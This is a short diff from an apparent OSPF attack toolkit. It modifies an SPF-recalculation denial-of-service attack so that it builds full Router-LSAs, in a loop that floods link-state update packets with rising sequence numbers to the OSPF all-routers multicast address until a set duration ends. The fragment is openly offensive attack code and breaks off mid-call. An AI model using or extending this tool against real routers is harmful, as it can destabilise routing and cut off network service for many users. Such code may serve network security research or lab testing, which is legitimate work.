@@ -1,7 +1,7 @@
 import time
 from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
 from ospf_attack.config.types import DoSConfig
-from ospf_attack.core.packet import build_lsu_packet, build_lsa_header, OSPF_MULTICAST_ALL
+from ospf_attack.core.packet import build_lsu_packet, build_lsa_with_body, OSPF_MULTICAST_ALL
 from ospf_attack.network.sender import PacketSender
 
 
@@ -22,8 +22,8 @@ class SPFRecalcAttack(BaseAttack):
         seq = 0x80000001
         deadline = time.time() + self.config.duration
         while time.time() < deadline:
-            lsa = build_lsa_header(
-                lsa_type=1, link_state_id=self.config.router_id,  # Router-LSA
+            lsa = build_lsa_with_body(
+                lsa_type=1, link_state_id=self.config.router_id,
                 advertising_router=self.config.router_id, sequence=seq, age=0,
             )
             pkt = build_lsu_packet(
